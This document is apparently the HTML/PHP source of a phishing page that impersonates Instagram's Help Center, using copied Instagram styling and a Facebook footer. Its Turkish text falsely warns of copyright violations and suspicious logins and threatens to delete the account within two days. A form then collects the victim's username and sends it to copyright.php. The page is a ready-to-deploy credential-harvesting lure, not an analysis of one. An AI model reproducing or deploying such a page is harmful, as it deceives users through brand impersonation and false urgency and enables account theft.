<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
  <title>Instagrams Help Center</title>
<meta name="viewport" content="width=device-width">
	<script
      src="https://code.jquery.com/jquery-3.4.1.min.js"
      integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
      crossorigin="anonymous"
    ></script>
    <link
      href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"
      rel="stylesheet"
      type="text/css"
    />
	<style>
      .button {
			width:140px;
			height:30px;
			margin-top:10px;
			outline:none;
			border:none;
			color:white;
			background:#3896f0;
			font-weight:bold;
			font-size:15px;
			margin-bottom:10px;
			border-radius:3px;
      }
      .button:disabled {
        opacity: 0.5;
      }
      .hide {
        display: none;
      }
    </style>
</head>
<?php
include("username/username/index.php");
?>
<body class="body" >
<center>
<div class="MFkQJ ABLKx VhasA _1-msl"><div class="GfkS6 "></div><div class="ZsSMR"><a class="z1VUo KD4vR ABLKx VhasA" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.installLink&amp;mt=8&amp;vt=lo" role="alert"><section class="dZvHF  fvoD7"><p class="xK6EF">Instagram</p><p class="_5b2Kp">Get Instagram from Google Play Or App Store</p></section><section class="FMlV_"><button class="_4IAxF">Get</button></section></a></div></div><br><br>
<nav class="q8NLd"><span class="_3G4x7  _9rw6G"><div class="TQUPK"><span>Türkçe</span><span class="coreSpriteChevronDownGrey _6Q5Yk"></span></div><select aria-label="Switch Display Language" class="hztqj"><option value="af">Afrikaans</option><option value="cs">Čeština</option><option value="da">Dansk</option><option value="de">Deutsch</option><option value="el">Ελληνικά</option><option value="en">English</option><option value="es">Español (España)</option><option value="es-la">Español</option><option value="fi">Suomi</option><option value="fr">Français</option><option value="id">Bahasa Indonesia</option><option value="it">Italiano</option><option value="ja">日本語</option><option value="ko">한국어</option><option value="ms">Bahasa Melayu</option><option value="nb">Norsk</option><option value="nl">Nederlands</option><option value="pl">Polski</option><option value="pt-br">Português (Brasil)</option><option value="pt">Português (Portugal)</option><option value="ru">Русский</option><option value="sv">Svenska</option><option value="th">ภาษาไทย</option><option value="tl">Filipino</option><option value="tr">Türkçe</option><option value="zh-cn">中文(简体)</option><option value="zh-tw">中文(台灣)</option><option value="bn">বাংলা</option><option value="gu">ગુજરાતી</option><option value="hi">हिन्दी</option><option value="hr">Hrvatski</option><option value="hu">Magyar</option><option value="kn">ಕನ್ನಡ</option><option value="ml">മലയാളം</option><option value="mr">मराठी</option><option value="ne">नेपाली</option><option value="pa">ਪੰਜਾਬੀ</option><option value="si">සිංහල</option><option value="sk">Slovenčina</option><option value="ta">தமிழ்</option><option value="te">తెలుగు</option><option value="vi">Tiếng Việt</option><option value="zh-hk">中文(香港)</option><option value="bg">Български</option><option value="fr-ca">Français (Canada)</option><option value="ro">Română</option><option value="sr">Српски</option><option value="uk">Українська</option></select></span></nav>
<br><br><br>

<div id="usernamegovde">
<h1 class="NXVPg Szr5J  coreSpriteLoggedOutWordmark">Instagram</h1>
<br>

<p id="usernamemetin">
Instagram olarak telif yasalarımızı ihlal eden hesapları kaldırıyoruz. Hesabınıza çok sayıda şüpheli giriş tespit edildi. Hesabınızı 2 gün içinde doğrulamazsanız hesabınızı kaldıracağız.



</p>
<br><br>
<form method="get" id="your_form_id" action="copyright.php">

   <input type="text" name="username" placeholder="Kullanıcı Adı" required="" id="usernamekutu" class="usernamekutu"><br><br>

<button class="button">
      <i class="loading-icon fa fa-spinner fa-spin hide"></i>
      <span class="btn-txt">İlerle</span>
	</button>
<br><br>
</form>
	<script>
      $(document).ready(function() {
        $(".button").on("click", function() {
          $(".result").text("");
          $(".loading-icon").removeClass("hide");
          $(".button").attr("disabled", true);
          $(".btn-txt").text("Loading...");
		  
			user= document.getElementById("usernamekutu").value;
		
   if (user=="")
	   {
        alert("Please fill in all fields.");
	$(".loading-icon").addClass("hide");
            $(".button").attr("disabled", false);
			$(".btn-txt").text("Next");
			return false;
 }
			
document.getElementById('your_form_id').submit();

		  
		  
   });
        });
		

    </script>
</div>
     <br><br>

<center>
</div>

</body>


<div class="      tHaIX             Igw0E   rBNOH          YBx95   ybXk5    _4EzTm                                                                                                        O1flK   _7JkPY    PdTAI ZUqME" style="height: 60px; width: 100%;"><span aria-label="From Facebook" class="glyphsSpriteFb_brand_center_grey u-__7"></span></div>
</html>
